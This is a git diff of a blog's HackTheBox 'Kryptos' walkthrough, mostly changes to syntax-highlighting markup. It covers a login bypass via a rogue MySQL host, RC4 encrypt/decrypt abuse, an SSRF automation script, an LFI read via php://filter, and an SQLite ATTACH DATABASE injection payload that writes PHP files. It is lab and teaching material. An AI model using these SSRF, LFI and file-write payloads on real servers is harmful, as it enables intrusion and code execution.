+<span class="o">&gt;&gt;&gt;</span> <span class="k">print</span> <span class="n">md5</span><span class="p">(</span><span class="s">"rick"</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
+<span class="mi">891</span><span class="n">f490e5d7bdb06d90d56f8d7db405f</span>
+<span class="o">&gt;&gt;&gt;</span>
 </code></pre></div></div>
 <p><br>I created the table <code class="highlighter-rouge">users</code> with the columns <code class="highlighter-rouge">username</code>, <code class="highlighter-rouge">password</code> :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/kryptos# mysql
-Welcome to the MariaDB monitor.  Commands end with ; or \g.
-Your MariaDB connection id is 43
-Server version: 10.3.14-MariaDB-1 Debian buildd-unstable
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="o">@</span><span class="n">kali</span><span class="p">:</span><span class="o">~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">HTB</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">kryptos</span><span class="o">#</span> <span class="n">mysql</span>
+<span class="n">Welcome</span> <span class="k">to</span> <span class="n">the</span> <span class="n">MariaDB</span> <span class="n">monitor</span><span class="p">.</span>  <span class="n">Commands</span> <span class="k">end</span> <span class="k">with</span> <span class="p">;</span> <span class="k">or</span> <span class="err">\</span><span class="k">g</span><span class="p">.</span>
+<span class="n">Your</span> <span class="n">MariaDB</span> <span class="k">connection</span> <span class="n">id</span> <span class="k">is</span> <span class="mi">43</span>
+<span class="n">Server</span> <span class="k">version</span><span class="p">:</span> <span class="mi">10</span><span class="p">.</span><span class="mi">3</span><span class="p">.</span><span class="mi">14</span><span class="o">-</span><span class="n">MariaDB</span><span class="o">-</span><span class="mi">1</span> <span class="n">Debian</span> <span class="n">buildd</span><span class="o">-</span><span class="n">unstable</span>
 
-Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+<span class="n">Copyright</span> <span class="p">(</span><span class="k">c</span><span class="p">)</span> <span class="mi">2000</span><span class="p">,</span> <span class="mi">2018</span><span class="p">,</span> <span class="n">Oracle</span><span class="p">,</span> <span class="n">MariaDB</span> <span class="n">Corporation</span> <span class="n">Ab</span> <span class="k">and</span> <span class="n">others</span><span class="p">.</span>
 
-Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+<span class="k">Type</span> <span class="s1">'help;'</span> <span class="k">or</span> <span class="s1">'</span><span class="se">\h</span><span class="s1">'</span> <span class="k">for</span> <span class="n">help</span><span class="p">.</span> <span class="k">Type</span> <span class="s1">'</span><span class="se">\c</span><span class="s1">'</span> <span class="k">to</span> <span class="n">clear</span> <span class="n">the</span> <span class="k">current</span> <span class="k">input</span> <span class="k">statement</span><span class="p">.</span>
 
-MariaDB [(none)]&gt; use cryptor;
-Database changed
-MariaDB [cryptor]&gt; create table users ( username varchar(40) not null, password varchar(40) not null );
-Query OK, 0 rows affected (0.409 sec)
+<span class="n">MariaDB</span> <span class="p">[(</span><span class="k">none</span><span class="p">)]</span><span class="o">&gt;</span> <span class="n">use</span> <span class="n">cryptor</span><span class="p">;</span>
+<span class="k">Database</span> <span class="n">changed</span>
+<span class="n">MariaDB</span> <span class="p">[</span><span class="n">cryptor</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">create</span> <span class="k">table</span> <span class="n">users</span> <span class="p">(</span> <span class="n">username</span> <span class="n">varchar</span><span class="p">(</span><span class="mi">40</span><span class="p">)</span> <span class="k">not</span> <span class="k">null</span><span class="p">,</span> <span class="n">password</span> <span class="n">varchar</span><span class="p">(</span><span class="mi">40</span><span class="p">)</span> <span class="k">not</span> <span class="k">null</span> <span class="p">);</span>
+<span class="n">Query</span> <span class="n">OK</span><span class="p">,</span> <span class="mi">0</span> <span class="k">rows</span> <span class="n">affected</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">409</span> <span class="n">sec</span><span class="p">)</span>
 </code></pre></div></div>
 <p><br>Then I inserted my credentials (<code class="highlighter-rouge">rick:rick</code>) :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>MariaDB [cryptor]&gt; insert into users ( username, password ) values ( 'rick', '891f490e5d7bdb06d90d56f8d7db405f' );                                                                                                
 Query OK, 1 row affected (0.149 sec)
 </code></pre></div></div>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>MariaDB [cryptor]&gt; show tables;
-+-------------------+
-| Tables_in_cryptor |
-+-------------------+
-| users             |
-+-------------------+
-1 row in set (0.001 sec)
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">MariaDB</span> <span class="p">[</span><span class="n">cryptor</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">show</span> <span class="n">tables</span><span class="p">;</span>
+<span class="o">+</span><span class="c1">-------------------+</span>
+<span class="o">|</span> <span class="n">Tables_in_cryptor</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">-------------------+</span>
+<span class="o">|</span> <span class="n">users</span>             <span class="o">|</span>
+<span class="o">+</span><span class="c1">-------------------+</span>
+<span class="mi">1</span> <span class="k">row</span> <span class="k">in</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">001</span> <span class="n">sec</span><span class="p">)</span>
 
-MariaDB [cryptor]&gt; select * from users;
-+----------+----------------------------------+
-| username | password                         |
-+----------+----------------------------------+
-| rick     | 891f490e5d7bdb06d90d56f8d7db405f |
-+----------+----------------------------------+
-1 row in set (0.103 sec)
+<span class="n">MariaDB</span> <span class="p">[</span><span class="n">cryptor</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">users</span><span class="p">;</span>
+<span class="o">+</span><span class="c1">----------+----------------------------------+</span>
+<span class="o">|</span> <span class="n">username</span> <span class="o">|</span> <span class="n">password</span>                         <span class="o">|</span>
+<span class="o">+</span><span class="c1">----------+----------------------------------+</span>
+<span class="o">|</span> <span class="n">rick</span>     <span class="o">|</span> <span class="mi">891</span><span class="n">f490e5d7bdb06d90d56f8d7db405f</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">----------+----------------------------------+</span>
+<span class="mi">1</span> <span class="k">row</span> <span class="k">in</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">103</span> <span class="n">sec</span><span class="p">)</span>
 </code></pre></div></div>
 <p><br>Let’s test the query :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>MariaDB [cryptor]&gt; SELECT username, password FROM users WHERE username='rick' AND password='891f490e5d7bdb06d90d56f8d7db405f';
-+----------+----------------------------------+
-| username | password                         |
-+----------+----------------------------------+
-| rick     | 891f490e5d7bdb06d90d56f8d7db405f |
-+----------+----------------------------------+
-1 row in set (0.004 sec)
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">MariaDB</span> <span class="p">[</span><span class="n">cryptor</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">SELECT</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">username</span><span class="o">=</span><span class="s1">'rick'</span> <span class="k">AND</span> <span class="n">password</span><span class="o">=</span><span class="s1">'891f490e5d7bdb06d90d56f8d7db405f'</span><span class="p">;</span>
+<span class="o">+</span><span class="c1">----------+----------------------------------+</span>
+<span class="o">|</span> <span class="n">username</span> <span class="o">|</span> <span class="n">password</span>                         <span class="o">|</span>
+<span class="o">+</span><span class="c1">----------+----------------------------------+</span>
+<span class="o">|</span> <span class="n">rick</span>     <span class="o">|</span> <span class="mi">891</span><span class="n">f490e5d7bdb06d90d56f8d7db405f</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">----------+----------------------------------+</span>
+<span class="mi">1</span> <span class="k">row</span> <span class="k">in</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">004</span> <span class="n">sec</span><span class="p">)</span>
 
-MariaDB [cryptor]&gt; 
+<span class="n">MariaDB</span> <span class="p">[</span><span class="n">cryptor</span><span class="p">]</span><span class="o">&gt;</span> 
 </code></pre></div></div>
 <p><br>It’s working.
 <br>Now we can simply go to the login page, edit the form input <code class="highlighter-rouge">id</code>  and inject the <code class="highlighter-rouge">host</code> parameter then login with <code class="highlighter-rouge">rick:rick</code>.
 <br>
-<img src="/images/hackthebox/kryptos/5.png" alt="">
+<br><img src="/images/hackthebox/kryptos/5.png" alt=""><br>
 <br></p>
 <hr>
 
 <h2 id="rc4">RC4</h2>
 <p><br>After getting in I got this application which had 2 pages, first one was to encrypt a file :
-<img src="/images/hackthebox/kryptos/6.png" alt="">
-<br>
-<br>
+<br><img src="/images/hackthebox/kryptos/6.png" alt=""><br>
 <br>Second one was to decrypt a file but it was under construction :
-<img src="/images/hackthebox/kryptos/7.png" alt="">
+<br><img src="/images/hackthebox/kryptos/7.png" alt=""><br>
 <br>The encryption page had two encryption methods, <code class="highlighter-rouge">AES-CBC</code> and <code class="highlighter-rouge">RC4</code>, I searched about <code class="highlighter-rouge">RC4</code> and read about it <a href="https://www.geeksforgeeks.org/rc4-encryption-algorithm/" target="_blank" rel="noopener noreferrer">here</a>. As the article said, <code class="highlighter-rouge">RC4</code> is a stream cipher and it’s XOR based. The article also gave an example :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>RC4 Encryption 
+<pre><code class="language-pseudocode">RC4 Encryption 
 10011000 ? 01010000 = 11001000    
 
 RC4 Decryption 
 11001000 ? 01010000 = 10011000
-</code></pre></div></div>
+</code></pre>
 <p><br>As you can see, decryption and encryption are the exact same operation, which means that applying the encryption function on encrypted data will eventually decrypt that data if the key is the same used to encrypt it before. In other words, we can use the <code class="highlighter-rouge">RC4</code> encryption option in <code class="highlighter-rouge">encrypt.php</code> to encrypt and decrypt data. Let’s test it.
 <br>I created a file called <code class="highlighter-rouge">test.txt</code> with the word <code class="highlighter-rouge">test</code> in it, then I hosted it on a python server :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/kryptos# echo test &gt; test.txt
@@ -557,10 +553,8 @@ root@kali:~/Desktop/HTB/boxes/kryptos# python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 </code></pre></div></div>
 <p><br>Then I encrypted it :
-<img src="/images/hackthebox/kryptos/8.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/kryptos/9.png" alt="">
+<br><img src="/images/hackthebox/kryptos/8.png" alt=""><br>
+<br><img src="/images/hackthebox/kryptos/9.png" alt=""><br>
 <br>It returned a base-64 encoded string, if we try to decode it we will get nothing readable because the data is encrypted :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/kryptos# echo 'LFuc6DA=' | base64 -d 
 ,[0
@@ -571,10 +565,8 @@ root@kali:~/Desktop/HTB/boxes/kryptos# python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 </code></pre></div></div>
 <p><br>I applied the same encryption on the encrypted file :
-<img src="/images/hackthebox/kryptos/10.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/kryptos/11.png" alt="">
+<br><img src="/images/hackthebox/kryptos/10.png" alt=""><br>
+<br><img src="/images/hackthebox/kryptos/11.png" alt=""><br>
 <br>And I got the original data decrypted :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/kryptos# echo 'dGVzdAo=' | base64 -d
 test
@@ -584,17 +576,13 @@ test
 
 <h2 id="ssrf">SSRF</h2>
 <p><br>Great, we can encrypt and decrypt files, but reading our files isn’t really helpful. Earlier during the initial enumeration there was a forbidden directory <code class="highlighter-rouge">/dev</code>. When we provide a url to <code class="highlighter-rouge">/encrypt.php</code> to request a file and encrypt it the requests were made by the server, so I tested for server side request forgery :
-<img src="/images/hackthebox/kryptos/12.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/kryptos/13.png" alt=""></p>
+<br><img src="/images/hackthebox/kryptos/12.png" alt=""><br>
+<br><img src="/images/hackthebox/kryptos/13.png" alt=""><br></p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/kryptos# echo 'ZFab8VZUIV5qu5rKj1SWoME9ZBewRadWNQ4YR9dM/657ZSgW9mfb4h2q32cxgq1+M67NnqRzOMvibBdA9jHboYr6oC+fzHibzR903NzgQBTbcJMhLkhQPRkVpQheiyKIY0NIhL1gwSXAlLTsXxtTDF/RmUlTRvdraDyTHEb0slCruyQ+DUxVMbjR/wmRfZcjP0l8t4XKSdOulLrHZskwsku1mIupShlgyyaRsvWXlbRbU32t4wMYrN7AZWTihxwSmNd+yaGQ85wh3RqJuBXLcFBb3HkM1A==' | base64 -d &gt; dev.enc
 </code></pre></div></div>
-<p><img src="/images/hackthebox/kryptos/14.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/kryptos/15.png" alt=""></p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/kryptos# echo 'PGh0bWw+CiAgICA8aGVhZD4KICAgIDwvaGVhZD4KICAgIDxib2R5PgoJPGRpdiBjbGFzcz0ibWVudSI+CgkgICAgPGEgaHJlZj0iaW5kZXgucGhwIj5NYWluIFBhZ2U8L2E+CgkgICAgPGEgaHJlZj0iaW5kZXgucGhwP3ZpZXc9YWJvdXQiPkFib3V0PC9hPgoJICAgIDxhIGhyZWY9ImluZGV4LnBocD92aWV3PXRvZG8iPlRvRG88L2E+Cgk8L2Rpdj4KPC9ib2R5Pgo8L2h0bWw+Cg==' | base64 -d                                                                           
+<p><br><img src="/images/hackthebox/kryptos/14.png" alt=""><br>
+<br><img src="/images/hackthebox/kryptos/15.png" alt=""><br></p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/kryptos# echo 'PGh0bWw+CiAgICA8aGVhZD4KICAgIDwvaGVhZD4KICAgIDxib2R5PgoJPGRpdiBjbGFzcz0ibWVudSI+CgkgICAgPGEgaHJlZj0iaW5kZXgucGhwIj5NYWluIFBhZ2U8L2E+CgkgICAgPGEgaHJlZj0iaW5kZXgucGhwP3ZpZXc9YWJvdXQiPkFib3V0PC9hPgoJICAgIDxhIGhyZWY9ImluZGV4LnBocD92aWV3PXRvZG8iPlRvRG88L2E+Cgk8L2Rpdj4KPC9ib2R5Pgo8L2h0bWw+Cg==' | base64 -d                                                                           
 <span class="nt">&lt;html&gt;</span>
     <span class="nt">&lt;head&gt;</span>
     <span class="nt">&lt;/head&gt;</span>
@@ -611,7 +599,7 @@ root@kali:~/Desktop/HTB/boxes/kryptos#
 <p><br>It worked.
 <br>This process of “encryption –&gt; decoding and saving to a file –&gt; decryption –&gt; decoding” was a lot of steps and doing it manually through burp or the browser wasn’t efficient, so I wrote a script to automate it :
 <br><code class="highlighter-rouge">ssrf.py</code> :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python3</span>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python3</span>
 <span class="kn">import</span> <span class="nn">requests</span>
 <span class="kn">from</span> <span class="nn">os</span> <span class="kn">import</span> <span class="n">system</span>
 <span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64decode</span>
@@ -668,9 +656,9 @@ root@kali:~/Desktop/HTB/boxes/kryptos#
 <p><br>This script sends a request to <code class="highlighter-rouge">/encrypt.php</code> with the given <code class="highlighter-rouge">url</code>, then it retrieves the encrypted data and saves it in a file. It sends another request to <code class="highlighter-rouge">/encrypt.php</code> with the <code class="highlighter-rouge">url</code> to the encrypted file then it retrieves the decrypted data, saves it in a file then it prints it.
 <br>It saves encrypted files and decrypted files and names them according to this pattern : <code class="highlighter-rouge">ENCRYPTED_N</code>, <code class="highlighter-rouge">OUTPUT_N</code> where <code class="highlighter-rouge">N</code> is a number which is incremented by 1 every request.
 <br>I created a directory and called it <code class="highlighter-rouge">ssrf</code>, I ran a python server there then I ran my script :
-<img src="/images/hackthebox/kryptos/16.png" alt="">
+<br><img src="/images/hackthebox/kryptos/16.png" alt=""><br>
 <br><code class="highlighter-rouge">/dev</code> :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[?] URL : http://127.0.0.1/dev/
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[?] URL : http://127.0.0.1/dev/
 [*] Result :
 <span class="nt">&lt;html&gt;</span>
     <span class="nt">&lt;head&gt;</span>
@@ -685,7 +673,7 @@ root@kali:~/Desktop/HTB/boxes/kryptos#
 <span class="nt">&lt;/html&gt;</span>
 </code></pre></div></div>
 <p><br>I went to <code class="highlighter-rouge">/dev/index.php?view=todo</code> and I found some interesting stuff :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[?] URL : http://127.0.0.1/dev/index.php?view=todo
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[?] URL : http://127.0.0.1/dev/index.php?view=todo
 [*] Result :
 <span class="nt">&lt;html&gt;</span>
     <span class="nt">&lt;head&gt;</span>
@@ -709,7 +697,7 @@ root@kali:~/Desktop/HTB/boxes/kryptos#
 </code></pre></div></div>
 <p><br>There were 2 “done” things in this todo list : restricting access to <code class="highlighter-rouge">/dev</code> and disabling dangerous <code class="highlighter-rouge">php</code> functions which will be a problem if we could somehow upload/write files. However the things that haven’t been done yet were removing a <code class="highlighter-rouge">php</code> page called <code class="highlighter-rouge">sqlite_test_page.php</code> and removing a folder writable by everyone which was used for <code class="highlighter-rouge">sqlite</code> testing, probably used by the <code class="highlighter-rouge">sqlite_test_page.php</code>
 <br>I went to <code class="highlighter-rouge">/dev/sqlite_test_page.php</code> but I only got an empty <code class="highlighter-rouge">html</code> page :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[?] URL : http://127.0.0.1/dev/sqlite_test_page.php
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[?] URL : http://127.0.0.1/dev/sqlite_test_page.php
 [*] Result :
 <span class="nt">&lt;html&gt;</span>
 <span class="nt">&lt;head&gt;&lt;/head&gt;</span>
@@ -722,7 +710,7 @@ root@kali:~/Desktop/HTB/boxes/kryptos#
 
 <h2 id="lfi">LFI</h2>
 <p><br>As we saw, <code class="highlighter-rouge">/dev/index.php</code> had a parameter called <code class="highlighter-rouge">view</code> which was used to view other pages, There was a possible local file inclusion vulnerability here so I tested on <code class="highlighter-rouge">/index.php</code> and it worked :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[?] URL : http://127.0.0.1/dev/index.php?view=../index    
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[?] URL : http://127.0.0.1/dev/index.php?view=../index    
 [*] Result :
 <span class="nt">&lt;html&gt;</span>
     <span class="nt">&lt;head&gt;</span>
@@ -764,7 +752,7 @@ root@kali:~/Desktop/HTB/boxes/kryptos#
 <span class="nt">&lt;/html&gt;</span>
 </code></pre></div></div>
 <p><br>I wanted to read the <code class="highlighter-rouge">php</code> code of <code class="highlighter-rouge">sqlite_test_page.php</code> to know what’s in there so I tried the <code class="highlighter-rouge">php://filter/convert.base64-encode</code> wrapper (got it from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion" target="_blank" rel="noopener noreferrer">here</a>) and it worked :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[?] URL : http://127.0.0.1/dev/index.php?view=php://filter/convert.base64-encode/resource=sqlite_test_page
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[?] URL : http://127.0.0.1/dev/index.php?view=php://filter/convert.base64-encode/resource=sqlite_test_page
 [*] Result :
 <span class="nt">&lt;html&gt;</span>
     <span class="nt">&lt;head&gt;</span>
@@ -783,66 +771,66 @@ PGh0bWw+CjxoZWFkPjwvaGVhZD4KPGJvZHk+Cjw/cGhwCiRub19yZXN1bHRzID0gJF9HRVRbJ25vX3Jl
 
 <h2 id="sqli--arbitrary-file-write">SQLI –&gt; Arbitrary File Write</h2>
 <p><br><code class="highlighter-rouge">sqlite_test_page.php</code> :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?php
-$no_results = $_GET['no_results'];
-$bookid = $_GET['bookid'];
-$query = "SELECT * FROM books WHERE id=".$bookid;
-if (isset($bookid)) {
-   class MyDB extends SQLite3
-   {
-      function __construct()
-      {
-	 // This folder is world writable - to be able to create/modify databases from PHP code
-         $this-&gt;open('d9e28afcf0b274a5e0542abb67db0784/books.db');
-      }
-   }
-   $db = new MyDB();
-   if(!$db){
-      echo $db-&gt;lastErrorMsg();
-   } else {
-      echo "Opened database successfully\n";
-   }
-   echo "Query : ".$query."\n";
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nv">$no_results</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'no_results'</span><span class="p">];</span>
+<span class="nv">$bookid</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'bookid'</span><span class="p">];</span>
+<span class="nv">$query</span> <span class="o">=</span> <span class="s2">"SELECT * FROM books WHERE id="</span><span class="o">.</span><span class="nv">$bookid</span><span class="p">;</span>
+<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$bookid</span><span class="p">))</span> <span class="p">{</span>
+   <span class="k">class</span> <span class="nc">MyDB</span> <span class="k">extends</span> <span class="nx">SQLite3</span>
+   <span class="p">{</span>
+      <span class="k">function</span> <span class="nf">__construct</span><span class="p">()</span>
+      <span class="p">{</span>
+	 <span class="c1">// This folder is world writable - to be able to create/modify databases from PHP code
+</span>         <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">open</span><span class="p">(</span><span class="s1">'d9e28afcf0b274a5e0542abb67db0784/books.db'</span><span class="p">);</span>
+      <span class="p">}</span>
+   <span class="p">}</span>
+   <span class="nv">$db</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">MyDB</span><span class="p">();</span>
+   <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$db</span><span class="p">){</span>
+      <span class="k">echo</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">lastErrorMsg</span><span class="p">();</span>
+   <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+      <span class="k">echo</span> <span class="s2">"Opened database successfully</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+   <span class="p">}</span>
+   <span class="k">echo</span> <span class="s2">"Query : "</span><span class="o">.</span><span class="nv">$query</span><span class="o">.</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
 
-if (isset($no_results)) {
-   $ret = $db-&gt;exec($query);
-   if($ret==FALSE)
-    {
-	echo "Error : ".$db-&gt;lastErrorMsg();
-    }
-}
-else
-{
-   $ret = $db-&gt;query($query);
-   while($row = $ret-&gt;fetchArray(SQLITE3_ASSOC) ){
-      echo "Name = ". $row['name'] . "\n";
-   }
-   if($ret==FALSE)
-    {
-	echo "Error : ".$db-&gt;lastErrorMsg();
-    }
-   $db-&gt;close();
-}
-}
-?&gt;
+<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$no_results</span><span class="p">))</span> <span class="p">{</span>
+   <span class="nv">$ret</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">exec</span><span class="p">(</span><span class="nv">$query</span><span class="p">);</span>
+   <span class="k">if</span><span class="p">(</span><span class="nv">$ret</span><span class="o">==</span><span class="k">FALSE</span><span class="p">)</span>
+    <span class="p">{</span>
+	<span class="k">echo</span> <span class="s2">"Error : "</span><span class="o">.</span><span class="nv">$db</span><span class="o">-&gt;</span><span class="na">lastErrorMsg</span><span class="p">();</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="k">else</span>
+<span class="p">{</span>
+   <span class="nv">$ret</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="nv">$query</span><span class="p">);</span>
+   <span class="k">while</span><span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nv">$ret</span><span class="o">-&gt;</span><span class="na">fetchArray</span><span class="p">(</span><span class="nx">SQLITE3_ASSOC</span><span class="p">)</span> <span class="p">){</span>
+      <span class="k">echo</span> <span class="s2">"Name = "</span><span class="o">.</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">'name'</span><span class="p">]</span> <span class="o">.</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+   <span class="p">}</span>
+   <span class="k">if</span><span class="p">(</span><span class="nv">$ret</span><span class="o">==</span><span class="k">FALSE</span><span class="p">)</span>
+    <span class="p">{</span>
+	<span class="k">echo</span> <span class="s2">"Error : "</span><span class="o">.</span><span class="nv">$db</span><span class="o">-&gt;</span><span class="na">lastErrorMsg</span><span class="p">();</span>
+    <span class="p">}</span>
+   <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">close</span><span class="p">();</span>
+<span class="p">}</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
 </code></pre></div></div>
 <p><br>It takes two parameters : <code class="highlighter-rouge">no_results</code> and <code class="highlighter-rouge">bookid</code> :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$no_results = $_GET['no_results'];
-$bookid = $_GET['bookid'];
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$no_results</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'no_results'</span><span class="p">];</span>
+<span class="nv">$bookid</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'bookid'</span><span class="p">];</span>
 </code></pre></div></div>
 <p><br>And it appends <code class="highlighter-rouge">bookid</code> to a <code class="highlighter-rouge">sqlite</code> query without any filtering :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$query = "SELECT * FROM books WHERE id=".$bookid;
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$query</span> <span class="o">=</span> <span class="s2">"SELECT * FROM books WHERE id="</span><span class="o">.</span><span class="nv">$bookid</span><span class="p">;</span>
 </code></pre></div></div>
 <p><br>We also can see the name of the writable directory <code class="highlighter-rouge">d9e28afcf0b274a5e0542abb67db0784</code> :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code> // This folder is world writable - to be able to create/modify databases from PHP code
-         $this-&gt;open('d9e28afcf0b274a5e0542abb67db0784/books.db');
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="c1">// This folder is world writable - to be able to create/modify databases from PHP code
+</span>         <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">open</span><span class="p">(</span><span class="s1">'d9e28afcf0b274a5e0542abb67db0784/books.db'</span><span class="p">);</span>
 </code></pre></div></div>
 <p><br>With this <code class="highlighter-rouge">SQL</code> injection and the name of a writable directory, we can use the <code class="highlighter-rouge">SQLite</code> command <code class="highlighter-rouge">Attach Database</code> to write files (got it from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md" target="_blank" rel="noopener noreferrer">here</a>). 
 <br>I tried a test file first so the payload was like this :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1;ATTACH DATABASE 'd9e28afcf0b274a5e0542abb67db0784/test.php' AS test;CREATE TABLE test.pwn (dataz text);INSERT INTO test.pwn (dataz) VALUES ('&lt;?php echo "test" ?&gt;');
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">1</span><span class="p">;</span><span class="n">ATTACH</span> <span class="k">DATABASE</span> <span class="s1">'d9e28afcf0b274a5e0542abb67db0784/test.php'</span> <span class="k">AS</span> <span class="n">test</span><span class="p">;</span><span class="k">CREATE</span> <span class="k">TABLE</span> <span class="n">test</span><span class="p">.</span><span class="n">pwn</span> <span class="p">(</span><span class="n">dataz</span> <span class="n">text</span><span class="p">);</span><span class="k">INSERT</span> <span class="k">INTO</span> <span class="n">test</span><span class="p">.</span><span class="n">pwn</span> <span class="p">(</span><span class="n">dataz</span><span class="p">)</span> <span class="k">VALUES</span> <span class="p">(</span><span class="s1">'&lt;?php echo "test" ?&gt;'</span><span class="p">);</span>
 </code></pre></div></div>
 <p><br>First attempt failed apparently because of encoding issues so I <code class="highlighter-rouge">url</code>-encoded the payload and tried again:</p>
